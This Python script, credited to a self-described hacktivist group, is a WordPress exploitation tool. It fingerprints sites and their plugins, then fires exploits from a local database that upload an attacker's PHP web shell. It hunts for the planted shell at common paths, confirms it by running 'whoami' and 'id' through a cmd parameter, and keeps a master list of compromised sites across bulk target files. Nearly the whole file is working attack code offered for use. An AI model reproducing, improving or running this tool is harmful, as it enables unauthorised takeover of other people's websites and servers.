#!/usr/bin/env python3
"""
WordPress Advanced Security Scanner & Exploiter v6.0 - FINAL
Tools by BCEVM - Hacktivist Indonesia
"""

import requests
import argparse
import os
import re
import sys
import json
import time
import base64
from urllib.parse import urlparse, urlencode, quote
from datetime import datetime
from colorama import init, Fore, Style
import concurrent.futures

requests.packages.urllib3.disable_warnings()
init(autoreset=True)

BANNER = f"""
{Fore.RED}{'═' * 70}
{Fore.RED}╔{Fore.YELLOW}══════════════════════════════════════════════════════════════{Fore.RED}╗
{Fore.RED}║{Fore.YELLOW}    ██████╗  ██████╗███████╗██╗   ██╗███╗   ███╗    {Fore.RED}      ║
{Fore.RED}║{Fore.YELLOW}    ██╔══██╗██╔════╝██╔════╝██║   ██║████╗ ████║    {Fore.RED}      ║
{Fore.RED}║{Fore.YELLOW}    ██████╔╝██║     █████╗  ██║   ██║██╔████╔██║    {Fore.RED}      ║
{Fore.RED}║{Fore.YELLOW}    ██╔══██╗██║     ██╔══╝  ██║   ██║██║╚██╔╝██║    {Fore.RED}      ║
{Fore.RED}║{Fore.YELLOW}    ██████╔╝╚██████╗███████╗╚██████╔╝██║ ╚═╝ ██║    {Fore.RED}      ║
{Fore.RED}║{Fore.CYAN}      WordPress Security Scanner v6.0 (Final Edition)      {Fore.RED}║
{Fore.RED}║{Fore.WHITE}              Real Exploit Detection + Shell Upload        {Fore.RED}║
{Fore.RED}║{Fore.GREEN}              Tools by BCEVM - Hacktivist Indonesia       {Fore.RED}║
{Fore.RED}╚{Fore.YELLOW}══════════════════════════════════════════════════════════════{Fore.RED}╝
{Fore.RED}{'═' * 70}{Style.RESET_ALL}
"""

EXPLOIT_DB_PATH = "exploits/exploit_db.json"

def load_exploit_db(json_path=EXPLOIT_DB_PATH):
    if os.path.exists(json_path):
        try:
            with open(json_path, 'r') as f:
                db = json.load(f)
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Loaded {len(db)} plugins")
            return db
        except:
            return {}
    else:
        os.makedirs("exploits", exist_ok=True)
        return {}

def load_shell_file(shell_path):
    if os.path.exists(shell_path):
        with open(shell_path, 'rb') as f:
            content = f.read()
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Loaded shell: {shell_path} ({len(content)} bytes)")
        return content
    print(f"{Fore.RED}[-]{Style.RESET_ALL} Shell not found: {shell_path}")
    return None

class WordPressScanner:
    def __init__(self, target, shell_file=None, timeout=15):
        self.target = self._normalize(target)
        self.domain = self._extract_domain(target)
        self.timeout = timeout
        self.shell_content = load_shell_file(shell_file) if shell_file else None
        self.shell_b64 = base64.b64encode(self.shell_content).decode() if self.shell_content else ""
        self.EXPLOIT_DB = load_exploit_db()
        
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
        self.session.verify = False
        
        self.results = {
            "target": self.target,
            "wordpress": False,
            "version": None,
            "plugins": [],
            "vulnerabilities": [],
            "successful_exploits": [],
            "shells": []
        }
        self.has_vuln = False
    
    def _normalize(self, url):
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        return url.rstrip("/")
    
    def _extract_domain(self, url):
        return urlparse(url).netloc
    
    def _request(self, url, method="GET", data=None):
        try:
            if method == "GET":
                r = self.session.get(url, timeout=self.timeout)
            else:
                r = self.session.post(url, data=data, timeout=self.timeout)
            return r.text, r.status_code
        except:
            return "", 0
    
    def detect_wordpress(self):
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Detecting WordPress...")
        paths = ["/wp-login.php", "/wp-admin/", "/wp-content/"]
        for path in paths:
            _, status = self._request(self.target + path)
            if status in [200, 403, 302]:
                self.results["wordpress"] = True
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} WordPress detected!")
                return True
        return False
    
    def get_version(self):
        html, _ = self._request(self.target + "/readme.html")
        match = re.search(r'Version\s+([\d.]+)', html)
        if match:
            self.results["version"] = match.group(1)
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Version: {self.results['version']}")
    
    def find_plugins(self):
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Discovering plugins...")
        html, _ = self._request(self.target)
        plugins = set(re.findall(r'/wp-content/plugins/([^/"\'>]+)/', html, re.I))
        self.results["plugins"] = sorted(plugins)
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Found {len(plugins)} plugins")
        return plugins
    
    def check_vulns(self):
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Checking vulnerabilities...")
        vulns = []
        for plugin in self.results["plugins"]:
            if plugin in self.EXPLOIT_DB:
                for cve in self.EXPLOIT_DB[plugin].get("cves", []):
                    vulns.append({
                        "plugin": plugin,
                        "cve": cve.get("id", "Unknown"),
                        "severity": cve.get("severity", "MEDIUM")
                    })
        self.results["vulnerabilities"] = vulns
        self.has_vuln = len(vulns) > 0
        if vulns:
            print(f"{Fore.RED}[!]{Style.RESET_ALL} Found {len(vulns)} vulnerabilities")
        else:
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} No vulnerabilities")
        return vulns
    
    def exploit_plugin(self, plugin_name):
        """Exploit plugin dan return URL shell jika berhasil"""
        if plugin_name not in self.EXPLOIT_DB:
            return None
        
        exploits = self.EXPLOIT_DB[plugin_name].get("exploits", [])
        if not exploits:
            return None
        
        for exploit in exploits[:2]:  # Max 2 exploits per plugin
            print(f"\n{Fore.YELLOW}[!]{Style.RESET_ALL} Testing: {exploit.get('name', plugin_name)}")
            
            url = self.target + exploit.get("path", "/")
            method = exploit.get("method", "GET")
            params = exploit.get("params", {}).copy()
            
            # Ganti placeholder shell
            for k, v in params.items():
                if isinstance(v, str):
                    v = v.replace("{{SHELL_B64}}", self.shell_b64)
                    v = v.replace("{{SHELL_CONTENT}}", self.shell_content.decode() if self.shell_content else "")
                    params[k] = v
            
            try:
                if method == "POST":
                    content, status = self._request(url, "POST", data=params)
                else:
                    if params:
                        q = urlencode(params)
                        url = f"{url}?{q}"
                    content, status = self._request(url)
                
                print(f"  {Fore.CYAN}├──{Style.RESET_ALL} Status: {status}")
                print(f"  {Fore.CYAN}├──{Style.RESET_ALL} Length: {len(content)}")
                
                # HANYA SIMPAN JIKA STATUS 200
                if status != 200:
                    print(f"  {Fore.CYAN}└──{Style.RESET_ALL} {Fore.RED}[✗] Failed (HTTP {status}){Style.RESET_ALL}")
                    continue
                
                # Cek indikator sukses
                indicators = exploit.get("success_indicators", [])
                success = any(i.lower() in content.lower() for i in indicators)
                
                if not success:
                    print(f"  {Fore.CYAN}└──{Style.RESET_ALL} {Fore.RED}[✗] No indicators found{Style.RESET_ALL}")
                    continue
                
                print(f"  {Fore.CYAN}└──{Style.RESET_ALL} {Fore.GREEN}[✓] EXPLOIT SUCCESSFUL!{Style.RESET_ALL}")
                
                # Cari URL shell dari response
                shell_url = self._extract_shell_url(content, url)
                
                if not shell_url:
                    # Coba cari di lokasi umum
                    shell_url = self._find_shell()
                
                if shell_url:
                    # Verifikasi shell benar-benar working
                    if self._verify_shell(shell_url):
                        self.results["shells"].append(shell_url)
                        print(f"\n{Fore.GREEN}{'='*50}")
                        print(f"  🐚 SHELL UPLOADED SUCCESSFULLY!")
                        print(f"  📍 URL: {shell_url}")
                        print(f"  🔧 Test: {shell_url}?cmd=whoami")
                        print(f"{'='*50}{Style.RESET_ALL}")
                        return shell_url
                
                # Simpan exploit yang berhasil
                self.results["successful_exploits"].append({
                    "plugin": plugin_name,
                    "exploit": exploit.get("name"),
                    "url": url,
                    "status": status
                })
                
                return True
                
            except Exception as e:
                print(f"  {Fore.CYAN}└──{Style.RESET_ALL} {Fore.RED}Error: {str(e)[:50]}{Style.RESET_ALL}")
        
        return None
    
    def _extract_shell_url(self, content, request_url):
        """Extract shell URL from response"""
        patterns = [
            r'(https?://[^\s"\'<>]+\.php)',
            r'url":"([^"]+\.php)"',
            r'path":"([^"]+\.php)"',
            r'file":"([^"]+\.php)"'
        ]
        for pattern in patterns:
            match = re.search(pattern, content)
            if match:
                url = match.group(1)
                if not url.startswith("http"):
                    url = self.target + url
                return url
        return None
    
    def _find_shell(self):
        """Cari shell di lokasi umum"""
        shell_names = ["shell.php", "nana.php", "bcevm.php"]
        locations = ["/wp-content/uploads/", "/wp-content/uploads/2025/", "/wp-content/plugins/", "/"]
        
        for loc in locations:
            for name in shell_names:
                url = self.target + loc + name
                content, status = self._request(f"{url}?cmd=echo+test")
                if status == 200 and ("test" in content or "<?php" in content):
                    return url
        return None
    
    def _verify_shell(self, url):
        """Verifikasi shell benar-benar bisa eksekusi command"""
        test_cmds = ["whoami", "id", "echo OK"]
        for cmd in test_cmds:
            content, status = self._request(f"{url}?cmd={cmd}")
            if status == 200 and len(content) > 0 and "error" not in content.lower():
                return True
        return False
    
    def scan(self):
        """Main scan dengan progress"""
        print(f"\n{Fore.CYAN}{'═' * 70}")
        print(f"  🎯 TARGET: {self.target}")
        print(f"{'═' * 70}{Style.RESET_ALL}")
        
        if not self.detect_wordpress():
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Not a WordPress site")
            return self.results
        
        self.get_version()
        self.find_plugins()
        self.check_vulns()
        
        return self.results
    
    def save_report(self):
        """Simpan report hanya jika ada vuln"""
        if not self.has_vuln and not self.results["shells"]:
            return None
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        os.makedirs("reports", exist_ok=True)
        filename = f"reports/{self.domain}_{timestamp}.txt"
        
        lines = [
            "═" * 70,
            "BCEVM WordPress Security Scan - VULNERABLE TARGET",
            f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"Target: {self.target}",
            "═" * 70,
            "",
            "🔴 VULNERABILITIES FOUND",
            "─" * 40,
        ]
        
        for v in self.results["vulnerabilities"]:
            lines.append(f"  • {v['plugin']} - {v['cve']} [{v['severity']}]")
        
        if self.results["successful_exploits"]:
            lines.extend(["", "✅ SUCCESSFUL EXPLOITS", "─" * 40])
            for e in self.results["successful_exploits"]:
                lines.append(f"  • {e['plugin']}/{e['exploit']}")
                lines.append(f"    URL: {e['url']}")
        
        if self.results["shells"]:
            lines.extend(["", "🐚 SHELL ACCESS", "─" * 40])
            for s in self.results["shells"]:
                lines.append(f"  • {s}")
                lines.append(f"    Test: {s}?cmd=whoami")
        
        lines.extend(["", "═" * 70])
        
        with open(filename, 'w') as f:
            f.write("\n".join(lines))
        
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Report saved: {filename}")
        return filename

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(description="WordPress Security Scanner v6.0")
    parser.add_argument("target", nargs="?", help="Target URL")
    parser.add_argument("-f", "--file", help="File containing targets")
    parser.add_argument("--shell", help="Shell file to upload (e.g., nana.php)")
    parser.add_argument("--exploit", action="store_true", help="Exploit vulnerabilities")
    parser.add_argument("--list", action="store_true", help="List vulnerable targets")
    
    args = parser.parse_args()
    
    if args.list:
        if os.path.exists("vulnerable_targets.json"):
            with open("vulnerable_targets.json", 'r') as f:
                targets = json.load(f)
            print(f"\n{Fore.CYAN}📋 VULNERABLE TARGETS ({len(targets)}){Style.RESET_ALL}\n")
            for i, t in enumerate(targets, 1):
                print(f"{Fore.RED}[{i}]{Style.RESET_ALL} {t['target']}")
                print(f"    Shell: {'✅' if t.get('has_shell') else '❌'}")
                if t.get('shells'):
                    for s in t['shells']:
                        print(f"    └── {s}")
                print()
        else:
            print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} No vulnerable targets found")
        return
    
    # Single target
    if args.target:
        scanner = WordPressScanner(args.target, shell_file=args.shell)
        scanner.scan()
        
        if scanner.has_vuln and args.exploit:
            for vuln in scanner.results["vulnerabilities"]:
                scanner.exploit_plugin(vuln["plugin"])
        
        scanner.save_report()
        
        # Save to master list
        if scanner.has_vuln or scanner.results["shells"]:
            master = []
            if os.path.exists("vulnerable_targets.json"):
                with open("vulnerable_targets.json", 'r') as f:
                    master = json.load(f)
            
            # Remove duplicate
            master = [t for t in master if t.get("target") != args.target]
            master.append({
                "target": args.target,
                "timestamp": datetime.now().isoformat(),
                "vulns": len(scanner.results["vulnerabilities"]),
                "has_shell": len(scanner.results["shells"]) > 0,
                "shells": scanner.results["shells"]
            })
            
            with open("vulnerable_targets.json", 'w') as f:
                json.dump(master, f, indent=2)
        
        print(f"\n{Fore.CYAN}{'═' * 70}")
        if scanner.results["shells"]:
            print(f"{Fore.GREEN}✅ TARGET VULNERABLE - SHELL UPLOADED!{Style.RESET_ALL}")
            for s in scanner.results["shells"]:
                print(f"   🐚 {s}")
        elif scanner.has_vuln:
            print(f"{Fore.RED}⚠️ TARGET VULNERABLE{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}✅ TARGET CLEAN{Style.RESET_ALL}")
        print(f"{'═' * 70}{Style.RESET_ALL}")
        return
    
    # Multi-target scan
    if args.file:
        if not os.path.exists(args.file):
            print(f"{Fore.RED}[-]{Style.RESET_ALL} File not found")
            return
        
        with open(args.file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        print(f"\n{Fore.CYAN}{'═' * 70}")
        print(f"  📁 BULK SCAN MODE")
        print(f"  Targets: {len(targets)}")
        print(f"  Shell: {args.shell or 'None'}")
        print(f"{'═' * 70}{Style.RESET_ALL}\n")
        
        vulnerable_targets = []
        total = len(targets)
        
        for i, target in enumerate(targets, 1):
            print(f"\n{Fore.YELLOW}[{i}/{total}]{Style.RESET_ALL} Scanning: {target}")
            print(f"{Fore.CYAN}{'─' * 50}{Style.RESET_ALL}")
            
            scanner = WordPressScanner(target, shell_file=args.shell)
            scanner.scan()
            
            if scanner.has_vuln and args.exploit:
                for vuln in scanner.results["vulnerabilities"]:
                    scanner.exploit_plugin(vuln["plugin"])
            
            if scanner.has_vuln or scanner.results["shells"]:
                vulnerable_targets.append({
                    "target": target,
                    "vulns": len(scanner.results["vulnerabilities"]),
                    "shells": scanner.results["shells"]
                })
                scanner.save_report()
                print(f"\n{Fore.RED}[!]{Style.RESET_ALL} VULNERABLE! {len(scanner.results['vulnerabilities'])} vulns")
                if scanner.results["shells"]:
                    for s in scanner.results["shells"]:
                        print(f"  🐚 {s}")
            else:
                print(f"\n{Fore.GREEN}[✓]{Style.RESET_ALL} CLEAN")
        
        # Summary
        print(f"\n{Fore.CYAN}{'═' * 70}")
        print(f"  📊 SCAN SUMMARY")
        print(f"{'═' * 70}")
        print(f"  Total: {total}")
        print(f"  {Fore.RED}Vulnerable: {len(vulnerable_targets)}{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}Clean: {total - len(vulnerable_targets)}{Style.RESET_ALL}")
        print(f"{'═' * 70}{Style.RESET_ALL}")
        
        # Save master list
        master = []
        if os.path.exists("vulnerable_targets.json"):
            with open("vulnerable_targets.json", 'r') as f:
                master = json.load(f)
        
        for vt in vulnerable_targets:
            master = [t for t in master if t.get("target") != vt["target"]]
            master.append({
                "target": vt["target"],
                "timestamp": datetime.now().isoformat(),
                "vulns": vt["vulns"],
                "has_shell": len(vt.get("shells", [])) > 0,
                "shells": vt.get("shells", [])
            })
        
        with open("vulnerable_targets.json", 'w') as f:
            json.dump(master, f, indent=2)
        
        return
    
    print(f"{Fore.RED}[-]{Style.RESET_ALL} Please provide target or use -f")
    parser.print_help()

if __name__ == "__main__":
    main()
